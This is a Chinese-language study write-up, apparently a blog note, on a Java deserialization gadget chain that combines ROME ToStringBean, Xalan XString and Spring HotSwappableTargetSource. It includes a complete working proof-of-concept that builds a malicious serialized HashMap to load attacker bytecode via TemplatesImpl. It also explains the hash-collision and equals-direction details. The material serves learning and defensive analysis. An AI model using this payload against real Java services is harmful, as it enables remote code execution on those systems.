一，调用链总览

HashMap.readObject()

-><font style="color:#080808;background-color:#ffffff;">HotSwappableTargetSource.hashCode()</font>

<font style="color:#080808;background-color:#ffffff;">->HotSwappableTargetSource.equals()</font>

<font style="color:#080808;background-color:#ffffff;">->XString.equals()</font>

<font style="color:#080808;background-color:#ffffff;">->ToStringBean.toString()</font>

<font style="color:#080808;background-color:#ffffff;">->类加载....</font>

二，关键类说明

1.XString

上一条链子中我们利用了 ToStringBean 类的 toString 方法来加载恶意类，通过 ObjectBean 来自动触发 ToStringBean，而在这条链中我们不适用 ObjectBean 来触发 ToStringBean，我们使用 XSring 类， XString 是 Xalan 中的字符串包装类，其 `equals(Object obj)` 方法为了兼容不同类型的字符串对象，并不会直接进行类型比较，而是先调用 `obj.toString()`，再与自身保存的字符串进行比较。正是这一特性，使得攻击者能够控制 `toString()` 的调用目标，从而继续执行 Gadget 链  

<!-- 这是一张图片，ocr 内容为：PUBLIC BOOLEAN EQUALS(OBJECT OBJ2) 379 880  IF (NULL - OBJ2) 881 382 RETURN FALSE; 883 // IN ORDER TO HANDLE THE 'ALL' SEMANTICS OF 884 // NODESET COMPARISONS, WE ALWAYS CALL THE 385 // NODESET FUNCTION. 386 ELSE IF (OBJ2 INSTANCEOF XNODESET) 887 888 RETURN OBJ2.EQUALS(THIS); ELSE IF(OBJ2 INSTANCEOF XNUMBER) 389 1 OBJ2.EQUALS(THIS); 390 RETURN 891 ELSE RETURN STR().EQUALS(OBJ2.TOSTRING()); -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1785164670347-25f471db-1378-4d91-a530-5fda9d55df9b.png)

2.<font style="color:#080808;background-color:#ffffff;">HotSwappableTargetSource</font>

<font style="color:#080808;background-color:#ffffff;"> HotSwappableTargetSource 是 Spring 提供的热替换 TargetSource，内部仅维护一个 </font>`<font style="color:#080808;background-color:#ffffff;">target</font>`<font style="color:#080808;background-color:#ffffff;"> 字段，并提供 </font>`<font style="color:#080808;background-color:#ffffff;">getTarget()</font>`<font style="color:#080808;background-color:#ffffff;"> 与 </font>`<font style="color:#080808;background-color:#ffffff;">swap()</font>`<font style="color:#080808;background-color:#ffffff;"> 等方法。在本链中，并不是利用它的热替换能力，而是利用 </font>`<font style="color:#080808;background-color:#ffffff;">getTarget()</font>`<font style="color:#080808;background-color:#ffffff;"> 能够返回任意对象这一特性，使 </font>`<font style="color:#080808;background-color:#ffffff;">ToStringBean</font>`<font style="color:#080808;background-color:#ffffff;"> 的反射调用能够继续转移到内部包装的对象上</font>

三，poc

依旧直接先给出 poc 在分析：

```plain
public class App {
    public static void main(String[] args) throws Exception {
        byte[] evilBytes = Files.readAllBytes(
                Paths.get("D:/intellij/Rome/Rome02/Evil.class"));

        TemplatesImpl templates = new TemplatesImpl();
        setField(templates, "_bytecodes", new byte[][]{evilBytes});
        setField(templates, "_name", "Evil");
        setField(templates, "_tfactory", new TransformerFactoryImpl());

        ToStringBean evilToString = new ToStringBean(Templates.class, templates);

        HotSwappableTargetSource firstKey  = new HotSwappableTargetSource(evilToString);
        HotSwappableTargetSource secondKey = new HotSwappableTargetSource(new XString("xxx"));

        HashMap map = new HashMap();
        map.put("p1", 1);
        map.put("p2", 2);

        Object[] table = (Object[]) getField(map, "table");
        Object node1 = null;
        Object node2 = null;
        for (Object node : table) {
            if (node == null) continue;
            if (node1 == null) { node1 = node; }
            else { node2 = node; break; }
        }

        setField(node1, "key", firstKey);     // 先序列化
        setField(node2, "key", secondKey);    // 后序列化 equals(firstKey)
        setField(node1, "next", node2);


        System.out.println("=== serializing ===");
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("rome02.ser"));
        oos.writeObject(map);
        oos.close();

        System.out.println("=== deserializing ===");
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("rome02.ser"));
        ois.readObject();
        ois.close();
    }

    static void setField(Object obj, String name, Object value) throws Exception {
        Field f = obj.getClass().getDeclaredField(name);
        f.setAccessible(true);
        f.set(obj, value);
    }

    static Object getField(Object obj, String name) throws Exception {
        Field f = obj.getClass().getDeclaredField(name);
        f.setAccessible(true);
        return f.get(obj);
    }
}

```

总结一下整条链子的调用流程，我们定义了两个HotSwappableTargetSource 类的元素，一个用来包装 XString，一个用来包装 ToStringBean，将两个元素放进 HashMap，记得先放入无关元素再反射修改，通过制造 hash 冲突在 HashMap 反序列化时调用 equals 方法完成整条链子，其中有两点值得注意：

1.equals 调用方向

在构造链子时发现 HashMap 类和 HashTable 类的 equals 调用方向并不相同，值得说明

<!-- 这是一张图片，ocr 内容为：P.NEXT - NEWNODE(HASH, KEY, VALUE, NEXT:NULL); IF (BINCOUNT >: TREEIFY THRESHOLD - 1) // -1 FOR 1ST TREEIFYBIN(TAB, HASH); BREAK; L IF ( F(E.HASHASHASH&& 一 (KEY !- NULL && KEY.EQUALS(K))))) ((K E.KEY) - KEY BREAK; P E E; -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1785165140932-66ecdd97-3bcd-4f42-b348-6dcd23989599.png)

在 HashMap 类进行反序列化将元素插入存储桶中时，如果存储桶中已经存在元素说明发生了 hash 冲突，接下来会比较 key 的值，也就是调用 equals 方法，在 putVal 这个方法中，key,hash 表示的是需要恢复的当前元素的 key 和 key 的 hash 值，而 e 表示的是存储桶中已存在的元素，那么如上图所示 key.equals(k)就是调用的当前元素的 equals 方法与已经存在的元素的进行比较

<!-- 这是一张图片，ocr 内容为：// MAKES SURE THE KEY IS NOT ALREADY IN THE HASHTABLE. // THIS SHOULD NOT HAPPEN IN DESERIALIZED VERSION.  INT HASH - KEY.HASHCODE(); INT INDEX (HASH & OX7FFFFFFFF) % TAB.LENGTH; FOR (ENTRY<?,?> E 9 - TAB[INDEX] ; E !- NULL ; E - E.NEXT){ HASH) &&E.KEY.EQUALS(KEY)){ IF (E.HASH 三三 THROW NEW JAVA.IO.STREAMCORRUPTEDEXCEPTION(); -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1785165464454-61edff71-cf0b-417b-87a9-cbb8e4984687.png)

再看 HashTable 类中的<font style="color:#080808;background-color:#ffffff;">reconstitutionPut 方法，e 依旧表示的是桶中已存在元素，这里进行的比较是 e.equals(key)，发现没有，和 HashMap 中 equals 调用方向相反</font>

<font style="color:#080808;background-color:#ffffff;">总的来说就是 HashMap 类在恢复数据元素时是调用当前元素的 equals 方法与已存在的元素进行比较，而 HashTable 是调用的已存在元素的 equals 方法与当前元素进行比较，所以如果我们想触发 hash 冲突时要考虑使用的哪个类进行包装，又是需要调用哪个类的比较方法</font>

<font style="color:#080808;background-color:#ffffff;">2.hash 冲突</font>

<font style="color:#080808;background-color:#ffffff;">已经知道需要让 HashMap 中的两个在反序列化时发生 hash 冲突才能继续调用 equals 方法，但是查看我们的代码却并没有像之前的 cc 链一样使用"yz"和"zZ"来制造冲突，仔细查看 HotSwappableTargetSource 的 hashCode 方法：</font>

<!-- 这是一张图片，ocr 内容为：@OVERRIDE PUBLIC INT HASHCODE() ( RETURN HOTSWAPPABLETARGETSOURCE.CLASS.HASHCODE(); -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1785166040167-f77d06c6-0342-49d2-9166-a63b7a430bba.png)

该类的 hashCode 方法返回的是固定的<font style="color:#080808;background-color:#ffffff;">HotSwappableTargetSource.class.hashCode()，那我们不需要进行多余的构造，两个被放入 map 中的HotSwappableTargetSource 类元素就已经 hash 冲突了</font>

<font style="color:#080808;background-color:#ffffff;">3.</font>

<!-- 这是一张图片，ocr 内容为：OBJECT[] TABLE - (OBJECT[] GETFIELD(MAP, NAME:"TABLE"); OBJECT NODEL - NULL; OBJECT NODE2 NULL; FOR (OBJECT NODE: TABLE) IF NULL) (NODE CONTINUE; 三三 IF NODE; } (NODE1 NULI) MI NODE1 E2 - NODE; BREAK; } I NODE2 ELSE 川 -->
![](https://cdn.nlark.com/yuque/0/2026/png/55555950/1785166285338-2bf6c342-6c28-4fbb-a44d-a76dbad95330.png)

还有一点稍微和以前不同的是关于 hashmap 元素中的元素属性的反射修改，hashmap 中 entry 元素都是放在 table 数组中的，我们想要修改 hashmap 中元素的属性不能直接修改，先需要反射拿到 table 数组，在遍历 table 数组拿到需要修改的元素，在对其进行反射修改



